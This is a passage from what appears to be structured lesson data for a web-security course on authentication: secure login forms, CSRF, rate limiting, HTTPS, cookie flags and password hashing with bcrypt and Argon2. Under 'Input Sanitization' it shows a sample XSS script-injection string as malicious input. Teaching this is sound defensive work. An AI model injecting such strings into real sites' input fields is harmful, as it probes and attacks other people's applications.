            content: "This lesson focuses on the practical security measures every production authentication system must implement:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Building secure login forms",
              "Understanding why HTTPS is mandatory",
              "Storing passwords safely using modern hashing algorithms",
              "Understanding complete authentication flow diagrams"
            ]
          },
          {
            type: "paragraph",
            content: "These concepts are the foundation of secure applications used by companies like Google, GitHub, Amazon, Stripe, and Microsoft."
          }
        ]
      },
      {
        heading: "Secure Login Forms",
        blocks: [
          {
            type: "paragraph",
            content: "What is a Secure Login Form?"
          },
          {
            type: "paragraph",
            content: "A secure login form is more than just two input fields and a submit button."
          },
          {
            type: "paragraph",
            content: "It is a carefully designed interface that protects users against:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Password theft",
              "Account enumeration",
              "Brute-force attacks",
              "CSRF attacks",
              "XSS attacks",
              "Credential interception",
              "Session hijacking"
            ]
          },
          {
            type: "paragraph",
            content: "A login form is the front door of your application. Every attacker sees this page first."
          }
        ]
      },
      {
        heading: "Traditional Login Form",
        blocks: [
          {
            type: "paragraph",
            content: "A basic login form looks like this:"
          },
          {
            type: "code",
            language: "html",
            content: `<form method="POST">
    <input type="email" />
    <input type="password" />
    <button>Login</button>
</form>`
          },
          {
            type: "paragraph",
            content: "Although functional, this form lacks many security features."
          }
        ]
      },
      {
        heading: "Production Login Form",
        blocks: [
          {
            type: "paragraph",
            content: "A real production login form includes:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "HTTPS",
              "CSRF protection",
              "Secure cookies",
              "Validation",
              "Rate limiting",
              "Password masking",
              "Password manager support",
              "Autofill support",
              "Generic error messages",
              "Accessibility",
              "MFA support"
            ]
          },
          {
            type: "paragraph",
            content: "A production login form is actually a combination of frontend, backend, browser security, and server-side validation."
          }
        ]
      },
      {
        heading: "Login Form Lifecycle",
        blocks: [
          {
            type: "flow",
            steps: [
              "User", "→",
              "Open Login Page", "→",
              "Load HTML", "→",
              "Load CSRF Token", "→",
              "User Enters Credentials", "→",
              "Client Validation", "→",
              "Submit Form", "→",
              "HTTPS Request", "→",
              "Server Validation", "→",
              "Authentication", "→",
              "Session Creation", "→",
              "Redirect"
            ]
          },
          {
            type: "paragraph",
            content: "Every step has security implications."
          }
        ]
      },
      {
        heading: "Client-side Validation",
        blocks: [
          {
            type: "paragraph",
            content: "Client-side validation improves user experience."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `"use client"

const handleSubmit = () => {
    if (!email.includes("@")) {
        alert("Invalid email")
    }

    if (password.length < 12) {
        alert("Password too short")
    }
}`
          },
          {
            type: "paragraph",
            content: "Benefits:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Immediate feedback",
              "Fewer server requests",
              "Better UX"
            ]
          },
          {
            type: "paragraph",
            content: "However..."
          }
        ]
      },
      {
        heading: "Never Trust Client-side Validation",
        blocks: [
          {
            type: "paragraph",
            content: "Attackers can bypass JavaScript completely."
          },
          {
            type: "paragraph",
            content: "They can send requests directly:"
          },
          {
            type: "output",
            content: [
              "Browser",
              "",
              "×",
              "",
              "Direct HTTP Request",
              "",
              "↓",
              "",
              "Server"
            ]
          },
          {
            type: "paragraph",
            content: "Therefore:"
          },
          {
            type: "paragraph",
            content: "Always validate on the server again."
          },
          {
            type: "paragraph",
            content: "This is one of the most important authentication rules."
          }
        ]
      },
      {
        heading: "Server-side Validation",
        blocks: [
          {
            type: "paragraph",
            content: "The server should verify:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Email format",
              "Password format",
              "User existence",
              "Account status",
              "Password hash",
              "Rate limit",
              "CSRF token",
              "CAPTCHA (if required)"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (!email) {
    throw new Error("Invalid request")
}

if (!password) {
    throw new Error("Invalid request")
}`
          },
          {
            type: "paragraph",
            content: "Never rely only on frontend checks."
          }
        ]
      },
      {
        heading: "Preventing Account Enumeration",
        blocks: [
          {
            type: "paragraph",
            content: "One of the biggest beginner mistakes is revealing whether an account exists."
          },
          {
            type: "paragraph",
            content: "Bad:"
          },
          {
            type: "output",
            content: [
              "Email not found"
            ]
          },
          {
            type: "paragraph",
            content: "or"
          },
          {
            type: "output",
            content: [
              "Password incorrect"
            ]
          },
          {
            type: "paragraph",
            content: "Now attackers know the email exists."
          },
          {
            type: "paragraph",
            content: "Instead use:"
          },
          {
            type: "output",
            content: [
              "Invalid email or password."
            ]
          },
          {
            type: "paragraph",
            content: "Same message."
          },
          {
            type: "paragraph",
            content: "No information leaked."
          }
        ]
      },
      {
        heading: "Password Input Security",
        blocks: [
          {
            type: "paragraph",
            content: "Always use"
          },
          {
            type: "output",
            content: [
              "<input type=\"password\">"
            ]
          },
          {
            type: "paragraph",
            content: "instead of"
          },
          {
            type: "output",
            content: [
              "<input type=\"text\">"
            ]
          },
          {
            type: "paragraph",
            content: "This hides passwords from casual observation."
          }
        ]
      },
      {
        heading: "Show/Hide Password",
        blocks: [
          {
            type: "paragraph",
            content: "Modern applications allow users to reveal passwords temporarily."
          },
          {
            type: "output",
            content: [
              "**********",
              "",
              "👁 Show"
            ]
          },
          {
            type: "paragraph",
            content: "Benefits:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Fewer typing mistakes",
              "Better accessibility",
              "Improved UX"
            ]
          },
          {
            type: "paragraph",
            content: "This does not reduce security significantly because the user explicitly chooses to reveal it."
          }
        ]
      },
      {
        heading: "Password Managers",
        blocks: [
          {
            type: "paragraph",
            content: "Never block password managers."
          },
          {
            type: "paragraph",
            content: "Allow browsers to save credentials."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "html",
            content: `<input
    type="password"
    autocomplete="current-password"
/>`
          },
          {
            type: "paragraph",
            content: "For registration:"
          },
          {
            type: "output",
            content: [
              "autocomplete=\"new-password\""
            ]
          },
          {
            type: "paragraph",
            content: "Password managers encourage unique passwords and reduce credential reuse."
          }
        ]
      },
      {
        heading: "Secure Autocomplete",
        blocks: [
          {
            type: "paragraph",
            content: "Useful values include:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "username",
              "email",
              "current-password",
              "new-password",
              "one-time-code"
            ]
          },
          {
            type: "paragraph",
            content: "These help browsers autofill securely."
          }
        ]
      },
      {
        heading: "CSRF Protection",
        blocks: [
          {
            type: "paragraph",
            content: "Without protection:"
          },
          {
            type: "flow",
            steps: [
              "Attacker Website", "→",
              "Hidden Form", "→",
              "Victim Browser", "→",
              "Bank Website", "→",
              "Money Transfer"
            ]
          },
          {
            type: "paragraph",
            content: "The victim never realizes a request was made."
          },
          {
            type: "paragraph",
            content: "To prevent this:"
          },
          {
            type: "paragraph",
            content: "Server generates a random CSRF token."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Login Page", "→",
              "Random Token", "→",
              "User Submits", "→",
              "Server Verifies Token"
            ]
          },
          {
            type: "paragraph",
            content: "No valid token."
          },
          {
            type: "flow",
            steps: [
              "Reject request."
            ]
          }
        ]
      },
      {
        heading: "Input Sanitization",
        blocks: [
          {
            type: "paragraph",
            content: "Attackers may submit malicious input."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "<script>alert(\"Hacked\")</script>"
            ]
          },
          {
            type: "paragraph",
            content: "Always sanitize and validate inputs before processing them."
          }
        ]
      },
      {
        heading: "Rate Limiting Login Attempts",
        blocks: [
          {
            type: "paragraph",
            content: "Never allow unlimited attempts."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "5 attempts", "→",
              "Lock for 15 minutes"
            ]
          },
          {
            type: "paragraph",
            content: "or"
          },
          {
            type: "output",
            content: [
              "10 attempts/minute"
            ]
          },
          {
            type: "paragraph",
            content: "This significantly reduces brute-force attacks."
          }
        ]
      },
      {
        heading: "CAPTCHA Integration",
        blocks: [
          {
            type: "paragraph",
            content: "After repeated failures:"
          },
          {
            type: "flow",
            steps: [
              "Login", "→",
              "Multiple Failed Attempts", "→",
              "CAPTCHA", "→",
              "Continue Login"
            ]
          },
          {
            type: "paragraph",
            content: "Bots struggle to solve CAPTCHAs."
          },
          {
            type: "paragraph",
            content: "Humans usually can."
          }
        ]
      },
      {
        heading: "Secure Error Messages",
        blocks: [
          {
            type: "paragraph",
            content: "Avoid messages like:"
          },
          {
            type: "output",
            content: [
              "Incorrect password"
            ]
          },
          {
            type: "paragraph",
            content: "or"
          },
          {
            type: "output",
            content: [
              "User not found"
            ]
          },
          {
            type: "paragraph",
            content: "Instead:"
          },
          {
            type: "output",
            content: [
              "Invalid credentials."
            ]
          },
          {
            type: "paragraph",
            content: "Simple."
          },
          {
            type: "paragraph",
            content: "Consistent."
          },
          {
            type: "paragraph",
            content: "Secure."
          }
        ]
      },
      {
        heading: "Remember Me Option",
        blocks: [
          {
            type: "paragraph",
            content: "Many applications include:"
          },
          {
            type: "output",
            content: [
              "☑ Remember Me"
            ]
          },
          {
            type: "paragraph",
            content: "Internally this usually means:"
          },
          {
            type: "output",
            content: [
              "Long-lived Session Cookie"
            ]
          },
          {
            type: "paragraph",
            content: "Instead of"
          },
          {
            type: "output",
            content: [
              "Short Session Cookie"
            ]
          },
          {
            type: "paragraph",
            content: "Be cautious:"
          },
          {
            type: "paragraph",
            content: "Remember Me should never bypass authentication requirements such as MFA when appropriate."
          }
        ]
      },
      {
        heading: "Logging Authentication Events",
        blocks: [
          {
            type: "paragraph",
            content: "Every login attempt should be logged."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Timestamp",
              "User",
              "IP Address",
              "Browser",
              "Device",
              "Success",
              "Failure"
            ]
          },
          {
            type: "paragraph",
            content: "Logs help detect attacks."
          }
        ]
      },
      {
        heading: "HTTPS Importance",
        blocks: [
          {
            type: "paragraph",
            content: "What is HTTPS?"
          },
          {
            type: "paragraph",
            content: "HTTPS stands for"
          },
          {
            type: "output",
            content: [
              "HyperText Transfer Protocol Secure"
            ]
          },
          {
            type: "paragraph",
            content: "It encrypts communication between:"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Internet", "→",
              "Server"
            ]
          },
          {
            type: "paragraph",
            content: "Without HTTPS, anyone intercepting network traffic could potentially read or modify sensitive data."
          }
        ]
      },
      {
        heading: "HTTP vs HTTPS",
        blocks: [
          {
            type: "paragraph",
            content: "HTTP"
          },
          {
            type: "flow",
            steps: [
              "Username", "→",
              "Password", "→",
              "Readable"
            ]
          },
          {
            type: "paragraph",
            content: "HTTPS"
          },
          {
            type: "flow",
            steps: [
              "Username", "→",
              "Password", "→",
              "Encrypted", "→",
              "Unreadable"
            ]
          },
          {
            type: "paragraph",
            content: "Encryption protects data while it travels across the network."
          }
        ]
      },
      {
        heading: "Why HTTPS Exists",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine logging into your bank over public Wi-Fi."
          },
          {
            type: "paragraph",
            content: "Without HTTPS:"
          },
          {
            type: "flow",
            steps: [
              "Laptop", "→",
              "Public Wi-Fi", "→",
              "Attacker", "→",
              "Password Visible"
            ]
          },
          {
            type: "paragraph",
            content: "With HTTPS:"
          },
          {
            type: "flow",
            steps: [
              "Laptop", "→",
              "Encrypted Data", "→",
              "Attacker", "→",
              "Unreadable Ciphertext", "→",
              "Bank"
            ]
          },
          {
            type: "paragraph",
            content: "HTTPS dramatically reduces the risk of credential theft during transmission."
          }
        ]
      },
      {
        heading: "TLS Handshake",
        blocks: [
          {
            type: "paragraph",
            content: "Before sending data:"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Hello", "→",
              "Server", "→",
              "Certificate", "→",
              "Key Exchange", "→",
              "Encryption Established", "→",
              "Secure Communication"
            ]
          },
          {
            type: "paragraph",
            content: "This process establishes a secure encrypted connection."
          }
        ]
      },
      {
        heading: "Benefits of HTTPS",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Encrypts credentials",
              "Prevents packet sniffing",
              "Protects cookies",
              "Prevents man-in-the-middle attacks",
              "Improves user trust",
              "Required for many modern browser features",
              "Contributes to SEO"
            ]
          }
        ]
      },
      {
        heading: "Secure Cookies",
        blocks: [
          {
            type: "paragraph",
            content: "Cookies should use:"
          },
          {
            type: "output",
            content: [
              "Secure"
            ]
          },
          {
            type: "paragraph",
            content: "Meaning:"
          },
          {
            type: "paragraph",
            content: "Only sent over HTTPS."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "Set-Cookie:",
              "",
              "Secure",
              "",
              "HttpOnly",
              "",
              "SameSite=Lax"
            ]
          }
        ]
      },
      {
        heading: "HttpOnly Cookies",
        blocks: [
          {
            type: "paragraph",
            content: "JavaScript cannot access:"
          },
          {
            type: "output",
            content: [
              "document.cookie"
            ]
          },
          {
            type: "paragraph",
            content: "for HttpOnly cookies."
          },
          {
            type: "paragraph",
            content: "This helps reduce the impact of XSS attacks."
          }
        ]
      },
      {
        heading: "SameSite Cookies",
        blocks: [
          {
            type: "paragraph",
            content: "SameSite protects against CSRF."
          },
          {
            type: "paragraph",
            content: "Common values:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Strict",
              "Lax",
              "None"
            ]
          },
          {
            type: "paragraph",
            content: "Most authentication cookies use:"
          },
          {
            type: "output",
            content: [
              "Lax",
              "or",
              "Strict"
            ]
          },
          {
            type: "paragraph",
            content: "depending on the application's needs."
          }
        ]
      },
      {
        heading: "HSTS (HTTP Strict Transport Security)",
        blocks: [
          {
            type: "paragraph",
            content: "HSTS instructs browsers to always use HTTPS."
          },
          {
            type: "paragraph",
            content: "Example header:"
          },
          {
            type: "output",
            content: [
              "Strict-Transport-Security:",
              "max-age=31536000"
            ]
          },
          {
            type: "paragraph",
            content: "This prevents users from accidentally connecting over insecure HTTP after the first secure visit."
          }
        ]
      },
      {
        heading: "Mixed Content",
        blocks: [
          {
            type: "paragraph",
            content: "Never load resources like:"
          },
          {
            type: "flow",
            steps: [
              "HTTPS Website", "→",
              "HTTP Image", "→",
              "HTTP Script"
            ]
          },
          {
            type: "paragraph",
            content: "Mixed content weakens security and may be blocked by browsers."
          },
          {
            type: "paragraph",
            content: "Always use HTTPS for every resource."
          }
        ]
      },
      {
        heading: "Secure Password Storage",
        blocks: [
          {
            type: "paragraph",
            content: "Never Store Plain Passwords"
          },
          {
            type: "paragraph",
            content: "Worst practice:"
          },
          {
            type: "flow",
            steps: [
              "Database", "→",
              "john@example.com", "→",
              "password123"
            ]
          },
          {
            type: "paragraph",
            content: "If the database leaks:"
          },
          {
            type: "paragraph",
            content: "Everything is compromised immediately."
          },
          {
            type: "paragraph",
            content: "Correct Storage"
          },
          {
            type: "paragraph",
            content: "Store only password hashes."
          },
          {
            type: "flow",
            steps: [
              "Password", "→",
              "Hash Function", "→",
              "Hash", "→",
              "Database"
            ]
          },
          {
            type: "paragraph",
            content: "The original password should never be stored."
          }
        ]
      },
      {
        heading: "What is Hashing?",
        blocks: [
          {
            type: "paragraph",
            content: "Hashing transforms input into a fixed-length value."
          },
          {
            type: "flow",
            steps: [
              "Password", "→",
              "Hash Function", "→",
              "Long Random String"
            ]
          },
          {
            type: "paragraph",
            content: "The process is designed to be one-way."
          }
        ]
      },
      {
        heading: "Properties of Password Hashing",
        blocks: [
          {
            type: "paragraph",
            content: "A good password hash is:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Deterministic",
              "One-way",
              "Resistant to collisions",
              "Computationally expensive (for passwords)",
              "Resistant to GPU attacks (with modern algorithms)"
            ]
          }
        ]
      },
      {
        heading: "Why Not SHA-256?",
        blocks: [
          {
            type: "paragraph",
            content: "SHA-256 is an excellent cryptographic hash function but is too fast for password storage."
          },
          {
            type: "paragraph",
            content: "Fast hashes allow attackers to test billions of guesses quickly using GPUs."
          },
          {
            type: "paragraph",
            content: "Password hashing algorithms intentionally slow this process down."
          }
        ]
      },
      {
        heading: "Modern Password Hashing Algorithms",
        blocks: [
          {
            type: "paragraph",
            content: "bcrypt"
          },
          {
            type: "paragraph",
            content: "One of the most widely used algorithms."
          },
          {
            type: "flow",
            steps: [
              "Password", "→",
              "bcrypt", "→",
              "Hash"
            ]
          },
          {
            type: "paragraph",
            content: "Features:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Adaptive cost factor",
              "Slow by design",
              "Mature ecosystem"
            ]
          },
          {
            type: "paragraph",
            content: "Argon2"
          },
          {
            type: "paragraph",
            content: "Winner of the Password Hashing Competition."
          },
          {
            type: "paragraph",
            content: "Features:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Memory hard",
              "CPU intensive",
              "GPU resistant",
              "Modern design"
            ]
          },
          {
            type: "paragraph",
            content: "Many security professionals recommend Argon2id for new applications when available."
          }
        ]
      },
      {
        heading: "Password Verification",
        blocks: [
          {
            type: "paragraph",
            content: "Registration:"
          },
          {
            type: "flow",
            steps: [
              "Password", "→",
              "bcrypt", "→",
              "Database"
            ]
          },
          {
            type: "paragraph",
            content: "Login:"
          },
          {
            type: "flow",
            steps: [
              "Entered Password", "→",
              "bcrypt Verify", "→",
              "Stored Hash", "→",
              "Match?", "→",
              "Login Success"
            ]
          },
          {
            type: "paragraph",
            content: "Notice that the original password is never retrieved from the database."
          }
        ]
      },
      {
        heading: "Authentication Flow Diagrams",
        blocks: [
          {
            type: "paragraph",
            content: "Complete Registration Flow"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Registration Form", "→",
              "Validation", "→",
              "Hash Password", "→",
              "Store User", "→",
              "Create Account", "→",
              "Success"
            ]
          },
          {
            type: "paragraph",
            content: "Login Flow"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Login Form", "→",
              "HTTPS", "→",
              "Server", "→",
              "Validate Input", "→",
              "Find User", "→",
              "Compare Password Hash", "→",
              "Match?", "→",
              "Create Session", "→",
              "Return Cookie", "→",
              "Dashboard"
            ]
          },
          {
            type: "paragraph",
            content: "Failed Login Flow"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Wrong Password", "→",
              "Hash Comparison", "→",
              "Failure", "→",
              "Increase Failed Counter", "→",
              "Rate Limit Check", "→",
              "Return Generic Error"
            ]
          },
          {
            type: "paragraph",
            content: "MFA Authentication Flow"
          },
          {
            type: "flow",
            steps: [
              "Username", "→",
              "Password", "→",
              "Password Verified", "→",
              "Send OTP", "→",
              "User Enters OTP", "→",
              "OTP Valid?", "→",
              "Create Session", "→",
              "Dashboard"
            ]
          },
          {
            type: "paragraph",
            content: "Even if the password is compromised, the attacker still needs the second authentication factor."
          },
          {
            type: "paragraph",
            content: "Password Reset Flow"
          },
          {
            type: "flow",
            steps: [
              "Forgot Password", "→",
              "Enter Email", "→",
              "Generate Reset Token", "→",
              "Store Token", "→",
              "Email Link", "→",
              "User Opens Link", "→",
              "Token Verified", "→",
              "Choose New Password", "→",
              "Hash Password", "→",
              "Update Database", "→",
              "Delete Reset Token", "→",
              "Login Again"
            ]
          }
        ]
      },
      {
        heading: "Secure Authentication Architecture",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `Browser

        │
        ▼
HTTPS Connection
        │
        ▼
Login Form
        │
        ▼
Server Validation
        │
        ▼
Rate Limiter
        │
        ▼
Authentication Service
        │
        ▼
Password Hash Verification
        │
        ▼
Session / JWT Creation
        │
        ▼
Secure Cookie
        │
        ▼
Protected Application`
          },
          {
            type: "paragraph",
            content: "Each layer adds a defense against a different class of attacks."
          }
        ]
      },
      {
        heading: "Real-World Production Example",
        blocks: [
          {
            type: "paragraph",
            content: "Consider an online banking application:"
          },
          {
            type: "list",
            style: "ordered",
            items: [
              "The user opens the login page over HTTPS.",
              "The browser loads a login form with CSRF protection.",
              "The user enters their email and password.",
              "The server validates the input and checks the rate limit.",
              "The password is verified against a bcrypt or Argon2 hash.",
              "If MFA is enabled, a one-time code is requested.",
              "After successful verification, the server creates a secure session and sends an HttpOnly, Secure, and SameSite cookie.",
              "All future authenticated requests use that session cookie until logout or expiration."
            ]
          },
          {
            type: "paragraph",
            content: "This layered approach ensures that even if one defense fails, additional protections remain in place."
          }
        ]
      },

      {
        heading: "Authentication Basics",
        blocks: [
          {
            type: "paragraph",
            content: "In the previous responses, you learned the fundamentals of authentication, password security, HTTPS, secure login forms, password hashing, salting, MFA, and authentication workflows."
          },
          {
            type: "paragraph",
            content: "However, knowing individual concepts is not enough to build a production-ready authentication system. Large-scale applications like Google, GitHub, Amazon, Microsoft, Stripe, Netflix, and Discord use carefully designed authentication architectures, multiple security layers, and industry best practices to protect millions of users."
          },
          {
            type: "paragraph",
            content: "In this lesson, we'll explore:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Production Authentication Architecture",
              "Common Authentication Mistakes",
              "Authentication Best Practices",
              "DevSphere Special Note",
              "Summary"
            ]
          },
          {
            type: "paragraph",
            content: "This is the final piece that connects everything you've learned into a complete production-ready authentication system."
          }
        ]
      },
      {
        heading: "Production Authentication Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "What is Authentication Architecture?"
          },
          {
            type: "paragraph",
            content: "Authentication architecture is the overall design of how users are authenticated throughout an application."
          },
          {
            type: "paragraph",
            content: "It defines:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "where login happens",
              "how passwords are verified",
              "how sessions are created",
              "how requests are authenticated",
              "where authorization occurs",
              "how logout works",
              "how tokens are refreshed",
              "how attacks are prevented"
            ]
          },
          {
            type: "paragraph",
            content: "Instead of focusing on individual functions, authentication architecture looks at the entire system."
          }
        ]
      },
      {
        heading: "Small Application Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "A beginner application usually looks like this:"
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Login Form", "→",
              "Server", "→",
              "Database"
            ]
          },
          {
            type: "paragraph",
            content: "Simple."
          },
          {
            type: "paragraph",
            content: "Easy to understand."
          },
          {
            type: "paragraph",
            content: "But it quickly becomes difficult to maintain as the application grows."
          }
        ]
      },
      {
        heading: "Production Authentication Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "Large applications separate responsibilities."
          },
          {
            type: "code",
            language: "text",
            content: `                Browser
                   │
                   ▼
           HTTPS Connection
                   │
                   ▼
          Authentication Gateway
                   │
        ┌──────────┴──────────┐
        ▼                     ▼
 Rate Limiter          CSRF Protection
        │                     │
        └──────────┬──────────┘
                   ▼
        Authentication Service
                   │
      ┌────────────┼────────────┐
      ▼            ▼            ▼
Password      MFA Service   OAuth Provider
Verification
      │
      ▼
 User Database
      │
      ▼
Session / JWT Service
      │
      ▼
 Secure Cookie / Token
      │
      ▼
 Protected Resources`
          },
          {
            type: "paragraph",
            content: "Notice that authentication is not a single login function."
          },
          {
            type: "paragraph",
            content: "It is an entire security system."
          }
        ]
      },
      {
        heading: "Authentication Layers",
        blocks: [
          {
            type: "paragraph",
            content: "A production authentication system generally contains multiple layers."
          },
          {
            type: "paragraph",
            content: "Layer 1 — HTTPS"
          },
          {
            type: "paragraph",
            content: "Every request must be encrypted."
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "HTTPS", "→",
              "Server"
            ]
          },
          {
            type: "paragraph",
            content: "Without HTTPS, every other security mechanism becomes much weaker."
          },
          {
            type: "paragraph",
            content: "Layer 2 — Input Validation"
          },
          {
            type: "paragraph",
            content: "Every login request is validated."
          },
          {
            type: "paragraph",
            content: "Check:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "email format",
              "password length",
              "required fields",
              "malformed requests"
            ]
          },
          {
            type: "paragraph",
            content: "Never trust browser input."
          },
          {
            type: "paragraph",
            content: "Layer 3 — Rate Limiting"
          },
          {
            type: "paragraph",
            content: "Prevent automated attacks."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "5 failed logins", "→",
              "Temporary lock", "→",
              "Try again later"
            ]
          },
          {
            type: "paragraph",
            content: "Layer 4 — Password Verification"
          },
          {
            type: "paragraph",
            content: "Passwords are compared using:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "bcrypt",
              "Argon2"
            ]
          },
          {
            type: "paragraph",
            content: "Never compare plain text passwords."
          },
          {
            type: "paragraph",
            content: "Layer 5 — MFA"
          },
          {
            type: "paragraph",
            content: "If enabled:"
          },
          {
            type: "flow",
            steps: [
              "Password", "→",
              "Verified", "→",
              "OTP", "→",
              "Verified", "→",
              "Login"
            ]
          },
          {
            type: "paragraph",
            content: "Even stolen passwords become much less useful."
          },
          {
            type: "paragraph",
            content: "Layer 6 — Session Creation"
          },
          {
            type: "paragraph",
            content: "After authentication:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Create Session", "→",
              "Secure Cookie", "→",
              "Dashboard"
            ]
          },
          {
            type: "paragraph",
            content: "Or generate a JWT depending on the application's architecture."
          },
          {
            type: "paragraph",
            content: "Layer 7 — Authorization"
          },
          {
            type: "paragraph",
            content: "Authentication answers:"
          },
          {
            type: "output",
            content: [
              "Who are you?"
            ]
          },
          {
            type: "paragraph",
            content: "Authorization answers:"
          },
          {
            type: "output",
            content: [
              "What are you allowed to do?"
            ]
          },
          {
            type: "paragraph",
            content: "These are separate steps."
          }
        ]
      },
      {
        heading: "Production Login Flow",
        blocks: [
          {
            type: "paragraph",
            content: "A modern authentication flow looks like this."
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Login Page", "→",
              "HTTPS", "→",
              "Server Validation", "→",
              "Rate Limiting", "→",
              "Database Lookup", "→",
              "Verify Password Hash", "→",
              "Check MFA", "→",
              "Generate Session", "→",
              "Set Secure Cookie", "→",
              "Redirect Dashboard"
            ]
          },
          {
            type: "paragraph",
            content: "Every step exists for a reason."
          }
        ]
      },
      {
        heading: "Registration Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "Registration follows a different flow."
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Registration Form", "→",
              "Validate Input", "→",
              "Check Existing User", "→",
              "Hash Password", "→",
              "Store User", "→",
              "Email Verification", "→",
              "Account Activated"
            ]
          },
          {
            type: "paragraph",
            content: "Notice that passwords are hashed before storage."
          }
        ]
      },
      {
        heading: "Logout Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "Logging out is equally important."
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Logout", "→",
              "Destroy Session", "→",
              "Delete Cookie", "→",
              "Redirect Login"
            ]
          },
          {
            type: "paragraph",
            content: "Never leave active sessions behind."
          }
        ]
      },
      {
        heading: "Password Reset Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "Password reset should never ask for the old password through email."
          },
          {
            type: "paragraph",
            content: "Instead:"
          },
          {
            type: "flow",
            steps: [
              "Forgot Password", "→",
              "Enter Email", "→",
              "Generate Token", "→",
              "Email Link", "→",
              "Verify Token", "→",
              "New Password", "→",
              "Hash Password", "→",
              "Update Database", "→",
              "Delete Token"
            ]
          },
          {
            type: "paragraph",
            content: "Reset tokens should expire quickly."
          }
        ]
      },
      {
        heading: "OAuth Authentication Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "User", "→",
              "Login with Google", "→",
              "Google Login", "→",
              "Google Returns Token", "→",
              "Verify Token", "→",
              "Create Local Session", "→",
              "Dashboard"
            ]
          },
          {
            type: "paragraph",
            content: "The application trusts Google's identity verification but still creates its own session."
          }
        ]
      },
      {
        heading: "Microservices Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "Large companies often separate authentication."
          },
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "API Gateway", "→",
              "Authentication Service", "→",
              "JWT", "→",
              "Microservice A",
              "Microservice B",
              "Microservice C"
            ]
          },
          {
            type: "paragraph",
            content: "This allows every service to verify user identity independently."
          }
        ]
      },
      {
        heading: "Authentication Architecture in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "Typical App Router architecture:"
          },
          {
            type: "tree",
            content: `app/
├── login/
├── dashboard/
├── middleware.ts
├── lib/
│   └── auth.ts
└── actions/
    ├── login.ts
    ├── logout.ts
    └── session.ts`
          },
          {
            type: "paragraph",
            content: "Responsibilities remain separated."
          }
        ]
      },
      {
        heading: "Common Authentication Mistakes",
        blocks: [
          {
            type: "paragraph",
            content: "Even experienced developers sometimes introduce security flaws."
          },
          {
            type: "paragraph",
            content: "Let's explore the most common ones."
          },
          {
            type: "paragraph",
            content: "1. Storing Plain Passwords"
          },
          {
            type: "paragraph",
            content: "Never do this."
          },
          {
            type: "output",
            content: [
              "Database",
              "",
              "password123"
            ]
          },
          {
            type: "paragraph",
            content: "Instead:"
          },
          {
            type: "output",
            content: [
              "Database",
              "",
              "$2b$12$..."
            ]
          },
          {
            type: "paragraph",
            content: "Only password hashes should be stored."
          },
          {
            type: "paragraph",
            content: "2. Using Weak Hash Functions"
          },
          {
            type: "paragraph",
            content: "Avoid:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "MD5",
              "SHA1"
            ]
          },
          {
            type: "paragraph",
            content: "Even SHA-256 alone is not recommended for password storage."
          },
          {
            type: "paragraph",
            content: "Use:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "bcrypt",
              "Argon2"
            ]
          },
          {
            type: "paragraph",
            content: "3. No HTTPS"
          },
          {
            type: "paragraph",
            content: "Without HTTPS:"
          },
          {
            type: "flow",
            steps: [
              "Password", "→",
              "Internet", "→",
              "Visible"
            ]
          },
          {
            type: "paragraph",
            content: "Always enforce HTTPS."
          },
          {
            type: "paragraph",
            content: "4. Trusting Client Validation"
          },
          {
            type: "paragraph",
            content: "Never assume JavaScript validation is enough."
          },
          {
            type: "paragraph",
            content: "Attackers can bypass the browser completely."
          },
          {
            type: "paragraph",
